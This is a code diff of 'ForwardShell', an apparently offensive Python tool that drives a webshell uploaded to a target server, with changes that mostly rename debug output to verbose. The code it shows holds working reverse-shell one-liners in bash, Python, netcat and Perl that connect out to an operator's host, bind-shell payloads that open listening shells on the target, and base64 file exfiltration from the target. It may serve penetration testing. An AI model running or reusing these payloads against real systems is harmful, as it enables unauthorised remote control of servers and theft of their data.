@@ -48,18 +48,19 @@ class WebShell(object):
         self.working_path = options.path
         self.display_prefix = options.prefix
         self.display_suffix = options.suffix
-        self.debug = options.debug
+        self.verbose = options.verbose
         
         # Set up proxy
-        if options.p:
-            self.proxies = {'http' : f'{options.P}'}
-            if self.debug: print(f"[DEBUG] Using proxy {self.proxies}")
-        else:
-            self.proxies = {}
+        self.proxies = {}
+        if options.P:
+            self.proxies = {'http': f'{options.P}'}
+        if self.verbose and options.P: print(f"[VERBOSE] Using proxy {self.proxies['http']}")
+
+            
         
         # Set up network speed
         self.interval=1 # == fast
-        if self.debug: print(f"[DEBUG] Using network connection speed {options.speed}")
+        if self.verbose: print(f"[VERBOSE] Using network connection speed {options.speed}")
         if options.speed.strip().lower() == 'insane':
             self.interval=0.25
         elif options.speed.strip().lower() == 'fast':
@@ -70,20 +71,17 @@ class WebShell(object):
             self.interval=3
 
         # Set up chunk size for file upload
-        self.chunk_size = 1850
+        self.chunk_size = 1850 # default if using GET
         if self.method == 'post':
             self.chunk_size = 80000
-            if self.debug: print(f"[DEBUG] Using a chunnk size of {self.chunk_size} characters when uploading files")
-        elif self.method == 'get':
-            self.chunk_size = 1850
-            if self.debug: print(f"[DEBUG] Using a chunk size of {self.chunk_size} characters when uploading files")
+        if self.verbose: print(f"[VERBOSE] Using a chunk size of {self.chunk_size} characters when uploading files")
 
         # Request local file path on target for needed binary files
         self.GetProg()
 
         # Set up fifo session
         self.session = random.randrange(10000,99999)
-        if self.debug: print(f"[DEBUG] Generate SessionID: {self.session}")
+        if self.verbose: print(f"[VERBOSE] Generate SessionID: {self.session}")
         self.stdin = f'{self.working_path}/Fwdsh-input.{self.session}'
         self.stdout = f'{self.working_path}/Fwdsh-output.{self.session}'
         MakeNamedPipes = f"{self.MKFIFO} {self.stdin}; {self.TAIL} -f {self.stdin} | {self.SH} 2>&1 > {self.stdout}"
@@ -101,9 +99,9 @@ class WebShell(object):
             self.RunRawCmd(ClearOutput)
         else:
             print(f"[ERROR] Cannot connect to {self.url}")
-            if self.debug:
-                print(f"[DEBUG] Server response was {CheckConnction}")
-                print(f"[DEBUG] Maybe you have to adjust the values for -prefix and -suffix")
+            if self.verbose:
+                print(f"[VERBOSE] Server response was {CheckConnction}")
+                print(f"[VERBOSE] Maybe you have to adjust the values for -prefix and -suffix")
             exit()
 
         # Set up read thread
@@ -256,7 +254,7 @@ class WebShell(object):
                 if self.BASH:
                     print(f'[*] Starting ReverseShell with Bash to {self.lhost} on port {self.lport}\n')
                     RevShellFormat = f"""{self.BASH} -c 'bash -i >& /dev/tcp/{self.lhost}/{self.lport} 0>&1' &"""
-                    if self.debug: print(f"[DEBUG] ReverseShell raw command {RevShellFormat}")
+                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
                     self.WriteCmd(RevShellFormat)
                 else:
                     print(f"[ERROR] No Bash found on target; ReverseShell not possible")
@@ -265,7 +263,7 @@ class WebShell(object):
                 if self.PYTHON:
                     print(f'[*] Starting ReverseShell with {self.PYTHON} to {self.lhost} on port {self.lport}')
                     RevShellFormat = f"""{self.PYTHON} -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{self.lhost}",{self.lport}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("{self.BASH}")' &"""
-                    if self.debug: print(f"[DEBUG] ReverseShell raw command {RevShellFormat}")
+                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
                     self.WriteCmd(RevShellFormat)
                 else:
                     print(f"[ERROR] No Python found on target; ReverseShell not possible")
@@ -275,7 +273,7 @@ class WebShell(object):
                 if self.NETCAT:
                     print(f'[*] Starting ReverseShell with {self.NETCAT} to {self.lhost} on port {self.lport}')
                     RevShellFormat = f"""{self.NETCAT} {self.lhost} {self.lport} -e {self.BASH} &"""
-                    if self.debug: print(f"[DEBUG] ReverseShell raw command {RevShellFormat}")
+                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
                     self.WriteCmd(RevShellFormat)
                 else:
                     print(f"[ERROR] No Netcat or equivalent found on target; ReverseShell not possible")
@@ -285,7 +283,7 @@ class WebShell(object):
                 if self.PERL:
                     print(f'[*] Starting ReverseShell with {self.PERL} to {self.lhost} on port {self.lport}\n')
                     RevShellFormat = f"""{self.PERL} -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{self.lhost}:{self.lport}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;' &"""
-                    if self.debug: print(f"[DEBUG] ReverseShell raw command {RevShellFormat}")
+                    if self.verbose: print(f"[VERBOSE] ReverseShell raw command {RevShellFormat}")
                     self.WriteCmd(RevShellFormat)
                 else:
                     print(f"[ERROR] No Perl found on target; ReverseShell not possible")
@@ -299,7 +297,7 @@ class WebShell(object):
             if self.NETCAT:
                 print(f'[*] Starting BindShell with {self.NETCAT} on port {self.lport}')
                 BindShellFormat = f"""{self.NETCAT} -nlvp {self.lport} -e {self.BASH} &"""
-                if self.debug: print(f"[DEBUG] BindShell raw command {BindShellFormat}")
+                if self.verbose: print(f"[VERBOSE] BindShell raw command {BindShellFormat}")
                 self.WriteCmd(BindShellFormat)
             else:
                 print(f"[ERROR] No Netcat or equivalent found on target; BindShell not possible")
@@ -309,7 +307,7 @@ class WebShell(object):
             if self.PYTHON:
                 print(f'[*] Starting BindShell with {self.PYTHON} on port {self.lport}')
                 BindShellFormat = f"""{self.PYTHON} -c 'import socket,os,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind(("0.0.0.0",{self.lport}));s.listen(5);c,a=s.accept();os.dup2(c.fileno(),0);os.dup2(c.fileno(),1);os.dup2(c.fileno(),2);p=subprocess.call(["{self.BASH}","-i"])' &"""
-                if self.debug: print(f"[DEBUG] BindShell raw command {BindShellFormat}")
+                if self.verbose: print(f"[VERBOSE] BindShell raw command {BindShellFormat}")
                 self.WriteCmd(BindShellFormat)
             else:
                 print(f"[ERROR] No Python found on target; BindShell not possible")
@@ -319,7 +317,7 @@ class WebShell(object):
             if self.PERL:
                 print(f'[*] Starting BindShell with {self.PERL} on port {self.lport}')
                 BindShellFormat = f"""{self.PERL} -MIO -e 'use Socket;$protocol=getprotobyname('tcp');socket(S,&PF_INET,&SOCK_STREAM,$protocol);setsockopt(S,SOL_SOCKET,SO_REUSEADDR,1);bind(S,sockaddr_in({self.lport},INADDR_ANY));listen(S,3);while(1){{accept(CONN,S);if(!($pid=fork)){{die "Cannot fork" if (!defined $pid);open STDIN,"<&CONN";open STDOUT,">&CONN";open STDERR,">&CONN";exec "/bin/bash -i";close CONN;exit 0;}}}}' &"""
-                if self.debug: print(f"[DEBUG] BindShell raw command {BindShellFormat}")
+                if self.verbose: print(f"[VERBOSE] BindShell raw command {BindShellFormat}")
                 self.WriteCmd(BindShellFormat)
             else:
                 print(f"[ERROR] No Perl found on target; BindShell not possible")
@@ -391,7 +389,7 @@ class WebShell(object):
     def DownloadFile(self, file):
         # gzip file, base64 it and request it
         file_download = f'{self.GZIP} {file} -c | {self.BASE64} -w0'
-        if self.debug: print(f"[DEBUG] Download file raw command {file_download}")
+        if self.verbose: print(f"[VERBOSE] Download file raw command {file_download}")
         print(f'[*] Downloading {file} in progress...')
         raw_result = self.WriteCmd(file_download, fifo=False)
         downloaded_file = self.DisplayResp(raw_result)
@@ -431,10 +429,10 @@ class WebShell(object):
         print(f'[*] Cleaning up sessions and files')
 
         if force == True:
-            if self.debug: print(f'[DEBUG] Terminating all Shells')
+            if self.verbose: print(f'[VERBOSE] Terminating all Shells')
             checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin.split(".")[0]} -e "-c import pty; pty.spawn("'
         else:
-            if self.debug: print(f'[DEBUG] Terminating {__progname__} with SessionID: {self.session}')
+            if self.verbose: print(f'[VERBOSE] Terminating {__progname__} with SessionID: {self.session}')
             checkProcess = f'{self.PS} -aux | {self.GREP} -e {self.stdin} -e "-c import pty; pty.spawn("'
         
         # read result of ps -aux and kill processes
@@ -445,7 +443,7 @@ class WebShell(object):
         for process in processes[0:]:
             if process >= '1':
                 killproc = f'{self.KILL} {process.split()[1]}'
-                if self.debug: print(f"[DEBUG] Kill process {process.split()[1]}")
+                if self.verbose: print(f"[VERBOSE] Kill process {process.split()[1]}")
                 self.WriteCmd(killproc, fifo=False)
             elif process < '1':
                 pass
@@ -457,7 +455,7 @@ class WebShell(object):
             Fwdshellfiles = f'{self.RM} -f {self.stdin.split(".")[0]}.* ; {self.RM} -f {self.stdout.split(".")[0]}.*'
         else:
             Fwdshellfiles = f'{self.RM} -f {self.stdin} {self.stdout}'
-        if self.debug: print(f"[DEBUG] Send data: {Fwdshellfiles}")
+        if self.verbose: print(f"[VERBOSE] Send data: {Fwdshellfiles}")
         self.WriteCmd(Fwdshellfiles, fifo=False)
         print(f'[*] Have a nice day :-)')
         exit()
@@ -479,12 +477,12 @@ class WebShell(object):
         if fifo:
             # if fifo enabled redirect the command in fifo-stdin
             stage_cmd = f'{self.ECHO} {b64cmd} | {self.BASE64} -d > {self.stdin}'
-            if self.debug: print(f"[DEBUG] Send data: {stage_cmd}")
+            if self.verbose: print(f"[VERBOSE] Send data: {stage_cmd}")
             self.RunRawCmd(stage_cmd)
         else:
             # if fifo disabled pipe the command directly to the shell
             stage_cmd = f'{self.ECHO} {b64cmd} | {self.BASE64} -d | {self.SH} 2>&1'
-            if self.debug: print(f"[DEBUG] Send data: {stage_cmd}")
+            if self.verbose: print(f"[VERBOSE] Send data: {stage_cmd}")
             return (self.RunRawCmd(stage_cmd))
         time.sleep(self.interval *1.0)
 
@@ -556,7 +554,7 @@ class WebShell(object):
                 filename = f'{self.WHICH} {file}'
                 raw_result = self.RunRawCmd(filename)
                 result = self.DisplayResp(raw_result)
-                if self.debug: print(f"[DEBUG] Found binary {result}")
+                if self.verbose: print(f"[VERBOSE] Found binary path {result}")
                 return result
 
         except:
@@ -567,7 +565,7 @@ class WebShell(object):
                 raw_result = self.RunRawCmd(filename)
                 result = self.DisplayResp(raw_result)
                 if result:
-                    if self.debug: print(f"[DEBUG] Found binary {result}")
+                    if self.verbose: print(f"[VERBOSE] Found binary path {result}")
                     return result
                     break
                 else:
@@ -629,7 +627,7 @@ class WebShell(object):
 # Process command-line arguments.
 if __name__ == '__main__':
     __progname__ = 'ForwardShell'
-    __version__ = '0.2.1'
+    __version__ = '0.2.2'
 
     parser = argparse.ArgumentParser(
         add_help = True,
@@ -638,8 +636,8 @@ if __name__ == '__main__':
         epilog = 'HAVE FUN AND DON\'T BE EVIL!')
 
     parser.add_argument('-u', action='store', metavar='', help='http[s]://[fqdn,IP]/directory/upload/shell.[php,jsp]')
-    parser.add_argument('-p', action='store', metavar='', default = 'cmd', help='The parameter of the uploaded webshell which executes the command [default=cmd]')
     parser.add_argument('-m', action='store', metavar='', default = 'POST', help='HTTP method to use for requests [GET, POST; default=POST]')
+    parser.add_argument('-p', action='store', metavar='', default = 'cmd', help='The parameter of the uploaded webshell which executes the command [default=cmd]')
     parser.add_argument('-P', action='store', metavar='', default = '', help='Proxy to use for requests [http(s)://host:port]')
 
     group = parser.add_argument_group('you can use even more Bind- and ReverseShell arguments')
@@ -651,7 +649,7 @@ if __name__ == '__main__':
     group.add_argument('-path', action='store', metavar='', default = '/dev/shm', help='Default {__progname__} working path; Change it to /tmp if /dev/shm is not available')
     group.add_argument('-prefix', action='store', metavar='', default = False, help='If the WebShell responses with more then the expected output use -prefix to define the unneeded pattern in front the output')
     group.add_argument('-suffix', action='store', metavar='', default = False, help='If the WebShell responses with more then the expected output use -suffix to define the unneeded pattern after the output')
-    group.add_argument('-debug', action='store', metavar='', default = False, help='Set it to True if you need debug output')
+    group.add_argument('-verbose', action='store_true', default = False, help='Use it to set verbose output')
     options = parser.parse_args()
 
     if len(sys.argv)==1:
